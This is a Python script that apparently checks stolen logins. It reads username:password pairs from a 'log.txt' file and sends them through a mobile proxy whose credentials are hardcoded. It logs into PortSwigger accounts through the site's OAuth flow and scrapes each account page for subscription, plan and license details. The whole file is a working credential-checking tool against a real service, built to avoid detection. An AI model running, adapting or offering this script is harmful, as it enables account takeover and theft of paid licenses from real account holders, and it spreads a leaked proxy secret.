#!/usr/bin/env python3
"""Extract subscription data from MY ACCOUNT page"""

import requests
import json
import re
from urllib.parse import urljoin, parse_qs, urlparse

proxy_url = "http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029"

# Read first account
with open("log.txt", 'r', encoding='utf-8') as f:
    for line in f:
        line = line.strip()
        if line and not line.startswith("#"):
            username, password = line.split(":", 1)
            username = username.strip()
            password = password.strip()
            break

print(f"[*] Test account: {username}\n")

# Create session
session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
session.proxies.update({'http': proxy_url, 'https': proxy_url})

# OAuth Login
print("[1] OAuth Login...")
auth_url = "https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query"

try:
    resp = session.get(auth_url, allow_redirects=False, timeout=10)
    state = ""
    if resp.status_code in [301, 302, 303, 307, 308]:
        redirect_url = resp.headers.get('Location', '')
        if redirect_url and 'state=' in redirect_url:
            if not redirect_url.startswith('http'):
                redirect_url = urljoin("https://login.portswigger.net/", redirect_url)
            parsed = parse_qs(urlparse(redirect_url).query)
            if 'state' in parsed:
                state = parsed['state'][0]
            resp = session.get(redirect_url, allow_redirects=False, timeout=10)

    # Login
    login_url = f"https://login.portswigger.net/u/login"
    if state:
        login_url = f"{login_url}?state={state}"

    login_data = {
        "username": username,
        "password": password,
        "action": "default"
    }

    resp = session.post(login_url, data=login_data, allow_redirects=False, timeout=10)
    if resp.status_code in [301, 302, 303, 307, 308]:
        redirect_url = resp.headers.get('Location', '')
        if redirect_url:
            if not redirect_url.startswith('http'):
                redirect_url = urljoin("https://login.portswigger.net/", redirect_url)
            resp = session.get(redirect_url, allow_redirects=True, timeout=10)

    print(f"[✓] Login successful\n")
except Exception as e:
    print(f"[✗] Login error: {e}\n")
    exit(1)

# Get MY ACCOUNT page
print("[2] Fetching MY ACCOUNT page...")
url = "https://portswigger.net/#/my-account"

try:
    resp = session.get(url, allow_redirects=True, timeout=10)
    print(f"[✓] Page fetched (Status: {resp.status_code})\n")

    if resp.status_code != 200:
        print("[✗] Failed to fetch page")
        exit(1)

    html = resp.text

    # Parse HTML
    print("[3] Parsing page content...\n")

    # Method 1: Look for visible text containing subscription/plan info
    print("[A] Searching for subscription-related text:")
    print("=" * 80)

    if "You do not have any subscriptions" in html:
        print("[✓] Found: 'You do not have any subscriptions'")

    if "subscription" in html.lower():
        print("[✓] Found keyword: 'subscription'")

    if "plan" in html.lower():
        print("[✓] Found keyword: 'plan'")

    if "license" in html.lower():
        print("[✓] Found keyword: 'license'")

    # Method 2: Extract all JSON objects from page
    print("\n[B] Extracting JSON objects from page:")
    print("=" * 80)

    json_pattern = r'\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}'
    json_matches = re.findall(json_pattern, html)

    found_subscription_json = False
    for i, match in enumerate(json_matches):
        if any(keyword in match.lower() for keyword in ['subscription', 'plan', 'license', 'product']):
            print(f"\n[JSON {i+1}]")
            try:
                data = json.loads(match)
                print(json.dumps(data, indent=2)[:500])
                found_subscription_json = True
            except:
                print(match[:200])

    # Method 3: Extract data from data attributes using regex
    print("\n[C] Extracting data attributes:")
    print("=" * 80)

    data_attrs = re.findall(r'data-testid=["\']([^"\']*)["\']', html)
    for attr in data_attrs:
        if any(keyword in attr.lower() for keyword in ['subscription', 'plan', 'license', 'account']):
            print(f"  Found: {attr}")

    # Method 4: Look for script tags containing data
    print("\n[D] Extracting data from script tags:")
    print("=" * 80)

    scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
    for i, script in enumerate(scripts):
        if any(keyword in script.lower() for keyword in ['subscription', 'plan', 'license']):
            print(f"\n[Script {i+1}] (first 300 chars)")
            print(script[:300])

    # Method 5: Extract all visible text (remove HTML tags)
    print("\n[E] Visible page text (first 1000 chars):")
    print("=" * 80)

    text = re.sub(r'<[^>]*>', '', html)
    text = re.sub(r'\s+', ' ', text)
    print(text[:1000])

    # Save full HTML to file for manual inspection
    with open("my_account_page.html", "w", encoding="utf-8") as f:
        f.write(html)
    print("\n[✓] Full HTML saved to: my_account_page.html")

except Exception as e:
    print(f"[✗] Error: {e}")
    import traceback
    traceback.print_exc()
